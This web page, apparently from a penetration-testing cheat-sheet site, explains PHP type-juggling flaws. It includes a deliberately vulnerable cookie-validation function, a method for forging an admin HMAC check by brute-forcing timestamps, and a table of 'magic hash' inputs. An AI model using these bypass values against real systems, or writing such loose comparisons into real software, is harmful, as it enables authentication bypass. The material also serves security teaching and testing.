<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="All about type juggling techniques, methods, payloads, how/why/when they work.">
<meta name="theme-color" content="#FFFFFF">
<meta name="color-scheme" content="light dark"><meta property="og:title" content="Type Juggling" />
<meta property="og:description" content="All about type juggling techniques, methods, payloads, how/why/when they work." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/type_juggling/" /><meta property="article:section" content="docs" />
<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-12-10T11:35:25-05:00" />
<title>Type Juggling | Gray Hat Freelancing</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.64a87728b093e11175fa525a70ea4e519792eb379261a69cf96cc7a68c370634.js" integrity="sha256-ZKh3KLCT4RF1&#43;lJacOpOUZeS6zeSYaac&#43;WzHpow3BjQ=" crossorigin="anonymous"></script>

  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-124168691-2', 'auto');
	
	ga('send', 'pageview');
}
</script><!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(90832071, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/90832071" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4012275371022894"
     crossorigin="anonymous"></script>
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>



  





<ul class="book-languages">
  <li>
    <input type="checkbox" id="languages" class="toggle" />
    <label for="languages" class="flex justify-between">
      <a role="button" class="flex align-center">
        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
        English
      </a>
    </label>

    <ul>
      
    </ul>
  </li>
</ul>











  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/exercism_solutions/" class="">Exercism Solutions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/brute_force_cracking/" class="">Brute Force Cracking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/training_grounds/" class="">Training Grounds</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/wordpress/" class="">Wordpress Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/office_attacks/" class="">Attacking Office</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_discovery/" class="">Network Discovery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/source_code_management/" class="">Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csv_injection/" class="">Csv Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/command_injection/" class="">Command Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/java_rmi/" class="">Java RMI</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/oauth/" class="">OAuth</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/race_conditions/" class="">Race Conditions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/saml_injection/" class="">SAML Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/sql_injection/" class="">SQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/type_juggling/" class="active">Type Juggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xss_injection/" class="">XSS Injection</a>
  

        </li>
      
    
  </ul>











  
<ul>
  
  <li>
    <a href="/posts/"  >
        Blog
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
        Github
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
        Contribute
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Type Juggling</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#php-juggling-type-and-magic-hashes">PHP Juggling type and magic hashes</a>
      <ul>
        <li><a href="#type-juggling">Type Juggling</a>
          <ul>
            <li><a href="#true-statements">True statements</a></li>
            <li><a href="#null-statements">NULL statements</a></li>
            <li><a href="#example-vulnerable-code">Example vulnerable code</a></li>
          </ul>
        </li>
        <li><a href="#magic-hashes---exploit">Magic Hashes - Exploit</a></li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown"><h1 id="php-juggling-type-and-magic-hashes">
  PHP Juggling type and magic hashes
  <a class="anchor" href="#php-juggling-type-and-magic-hashes">#</a>
</h1>
<p>PHP provides two ways to compare two variables:</p>
<ul>
<li>Loose comparison using <code>== or !=</code> : both variables have &ldquo;the same value&rdquo;.</li>
<li>Strict comparison using <code>=== or !==</code> : both variables have &ldquo;the same type and the same value&rdquo;.</li>
</ul>
<p>PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.</p>
<blockquote>
<p>PHP8 won&rsquo;t try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like <code>0 == strcmp($_GET['username'], $password)</code> bypasses, since strcmp won&rsquo;t return null and spit a warning any longer, but will throw a proper exception instead.</p>
</blockquote>
<h2 id="type-juggling">
  Type Juggling
  <a class="anchor" href="#type-juggling">#</a>
</h2>
<h3 id="true-statements">
  True statements
  <a class="anchor" href="#true-statements">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#39;0010e2&#39;</span>   <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1e3&#39;</span>);           <span style="color:#75715e"># true
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#39;0xABCdef&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39; 0xABCdef&#39;</span>);     <span style="color:#75715e"># true PHP 5.0 / false PHP 7.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#39;0xABCdef&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;     0xABCdef&#39;</span>); <span style="color:#75715e"># true PHP 5.0 / false PHP 7.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#39;0x01&#39;</span>     <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)                <span style="color:#75715e"># true PHP 5.0 / false PHP 7.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#39;0x1234Ab&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1193131&#39;</span>);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#39;123&#39;</span>  <span style="color:#f92672">==</span> <span style="color:#ae81ff">123</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;123a&#39;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">123</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;abc&#39;</span>  <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">NULL</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>       <span style="color:#75715e"># true
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0</span>  <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>   <span style="color:#75715e"># true
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">false</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">NULL</span> <span style="color:#75715e"># true
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">NULL</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>    <span style="color:#75715e"># true
</span></span></span></code></pre></div><h3 id="null-statements">
  NULL statements
  <a class="anchor" href="#null-statements">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">sha1</span>([])); <span style="color:#75715e"># NULL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">md5</span>([]));  <span style="color:#75715e"># NULL
</span></span></span></code></pre></div><h3 id="example-vulnerable-code">
  Example vulnerable code
  <a class="anchor" href="#example-vulnerable-code">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">validate_cookie</span>($cookie,$key){
</span></span><span style="display:flex;"><span>	$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;md5&#39;</span>, $cookie[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;|&#39;</span> <span style="color:#f92672">.</span> $cookie[<span style="color:#e6db74">&#39;$expiration&#39;</span>], $key);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($cookie[<span style="color:#e6db74">&#39;hmac&#39;</span>] <span style="color:#f92672">!=</span> $hash){ <span style="color:#75715e">// loose comparison
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span> 
</span></span></code></pre></div><p>The <code>$cookie</code> variable is provided by the user. The $key variable is a secret and unknown to the user.</p>
<p>If we can make the calculated hash string Zero-like, and provide &ldquo;0&rdquo; in the <code>$cookie['hmac']</code>, the check will pass.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#e6db74">&#34;0e768261251903820937390661668547&#34;</span> == <span style="color:#e6db74">&#34;0&#34;</span>
</span></span></code></pre></div><p>We have control over 3 elements in the cookie:</p>
<ul>
<li><code>$username</code> - username you are targeting, probably &ldquo;admin&rdquo;</li>
<li><code>$hmac</code> - the provided hash, &ldquo;0&rdquo;</li>
<li><code>$expiration</code> - a UNIX timestamp, must be in the future</li>
</ul>
<p>Increase the expiration timestamp enough times and we will eventually get a Zero-like calculated HMAC.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>hash_hmac(admin|<span style="color:#ae81ff">1424869663</span>) -&gt; <span style="color:#e6db74">&#34;e716865d1953e310498068ee39922f49&#34;</span>
</span></span><span style="display:flex;"><span>hash_hmac(admin|<span style="color:#ae81ff">1424869664</span>) -&gt; <span style="color:#e6db74">&#34;8c9a492d316efb5e358ceefe3829bde4&#34;</span>
</span></span><span style="display:flex;"><span>hash_hmac(admin|<span style="color:#ae81ff">1424869665</span>) -&gt; <span style="color:#e6db74">&#34;9f7cdbe744fc2dae1202431c7c66334b&#34;</span>
</span></span><span style="display:flex;"><span>hash_hmac(admin|<span style="color:#ae81ff">1424869666</span>) -&gt; <span style="color:#e6db74">&#34;105c0abe89825a14c471d4f0c1cc20ab&#34;</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>hash_hmac(admin|<span style="color:#ae81ff">1835970773</span>) -&gt; <span style="color:#e6db74">&#34;0e174892301580325162390102935332&#34;</span> // <span style="color:#e6db74">&#34;0e174892301580325162390102935332&#34;</span> == <span style="color:#e6db74">&#34;0&#34;</span>
</span></span></code></pre></div><h2 id="magic-hashes---exploit">
  Magic Hashes - Exploit
  <a class="anchor" href="#magic-hashes---exploit">#</a>
</h2>
<p>If the hash computed starts with &ldquo;0e&rdquo; (or &ldquo;0..0e&rdquo;) only followed by numbers, PHP will treat the hash as a float.</p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>&ldquo;Magic&rdquo; Number / String</th>
<th style="text-align:center">Magic Hash</th>
<th style="text-align:right">Found By / Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD4</td>
<td>gH0nAdHk</td>
<td style="text-align:center">0e096229559581069251163783434175</td>
<td style="text-align:right"><a href="https://github.com/spaze/hashes/blob/master/md4.md">@spaze</a></td>
</tr>
<tr>
<td>MD4</td>
<td>IiF+hTai</td>
<td style="text-align:center">00e90130237707355082822449868597</td>
<td style="text-align:right"><a href="https://github.com/spaze/hashes/blob/master/md4.md">@spaze</a></td>
</tr>
<tr>
<td>MD5</td>
<td>240610708</td>
<td style="text-align:center">0e462097431906509019562988736854</td>
<td style="text-align:right"><a href="https://twitter.com/spazef0rze/status/439352552443084800">@spazef0rze</a></td>
</tr>
<tr>
<td>MD5</td>
<td>QNKCDZO</td>
<td style="text-align:center">0e830400451993494058024219903391</td>
<td style="text-align:right"><a href="https://twitter.com/spazef0rze/status/439352552443084800">@spazef0rze</a></td>
</tr>
<tr>
<td>MD5</td>
<td>0e1137126905</td>
<td style="text-align:center">0e291659922323405260514745084877</td>
<td style="text-align:right"><a href="https://twitter.com/spazef0rze/status/439352552443084800">@spazef0rze</a></td>
</tr>
<tr>
<td>MD5</td>
<td>0e215962017</td>
<td style="text-align:center">0e291242476940776845150308577824</td>
<td style="text-align:right"><a href="https://twitter.com/spazef0rze/status/439352552443084800">@spazef0rze</a></td>
</tr>
<tr>
<td>MD5</td>
<td>129581926211651571912466741651878684928</td>
<td style="text-align:center">06da5430449f8f6f23dfc1276f722738</td>
<td style="text-align:right">Raw: ?T0D??o#??&lsquo;or'8.N=?</td>
</tr>
<tr>
<td>SHA1</td>
<td>10932435112</td>
<td style="text-align:center">0e07766915004133176347055865026311692244</td>
<td style="text-align:right">Independently found by Michael A. Cleverly &amp; Michele Spagnuolo &amp; Rogdham</td>
</tr>
<tr>
<td>SHA-224</td>
<td>10885164793773</td>
<td style="text-align:center">0e281250946775200129471613219196999537878926740638594636</td>
<td style="text-align:right"><a href="https://twitter.com/TihanyiNorbert/status/1138075224010833921">@TihanyiNorbert</a></td>
</tr>
<tr>
<td>SHA-256</td>
<td>34250003024812</td>
<td style="text-align:center">0e46289032038065916139621039085883773413820991920706299695051332</td>
<td style="text-align:right"><a href="https://twitter.com/TihanyiNorbert/status/1148586399207178241">@TihanyiNorbert</a></td>
</tr>
<tr>
<td>SHA-256</td>
<td>TyNOQHUS</td>
<td style="text-align:center">0e66298694359207596086558843543959518835691168370379069085300385</td>
<td style="text-align:right"><a href="https://twitter.com/Chick3nman512/status/1150137800324526083">@Chick3nman512</a></td>
</tr>
</tbody>
</table>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;240610708&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;QNKCDZO&#39;</span>)); <span style="color:#75715e"># bool(true)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;aabg7XSs&#39;</span>)  <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;aabC9RqS&#39;</span>));
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#e6db74">&#39;aaroZmOk&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">sha1</span>(<span style="color:#e6db74">&#39;aaK1STfY&#39;</span>));
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#e6db74">&#39;aaO8zKZF&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">sha1</span>(<span style="color:#e6db74">&#39;aa3OFF9m&#39;</span>));
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h2 id="references">
  References
  <a class="anchor" href="#references">#</a>
</h2>
<ul>
<li><a href="http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Writing Exploits For Exotic Bug Classes: PHP Type Juggling By Tyler Borland</a></li>
<li><a href="https://www.whitehatsec.com/blog/magic-hashes/">Magic Hashes - WhiteHatSec</a></li>
<li><a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">PHP Magic Tricks: Type Juggling</a></li>
<li><a href="https://github.com/spaze/hashes">spaze/hashes - Magic hashes – PHP hash &ldquo;collisions&rdquo;</a></li>
<li><a href="https://offsec.almond.consulting/super-magic-hash.html">(Super) Magic Hashes - Mon 07 October 2019 - myst404 (@myst404_)</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">


  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d" title='Last modified by Stuart Gray | December 10, 2022' target="_blank" rel="noopener">
      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
      <span>December 10, 2022</span>
    </a>
  </div>




</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#php-juggling-type-and-magic-hashes">PHP Juggling type and magic hashes</a>
      <ul>
        <li><a href="#type-juggling">Type Juggling</a>
          <ul>
            <li><a href="#true-statements">True statements</a></li>
            <li><a href="#null-statements">NULL statements</a></li>
            <li><a href="#example-vulnerable-code">Example vulnerable code</a></li>
          </ul>
        </li>
        <li><a href="#magic-hashes---exploit">Magic Hashes - Exploit</a></li>
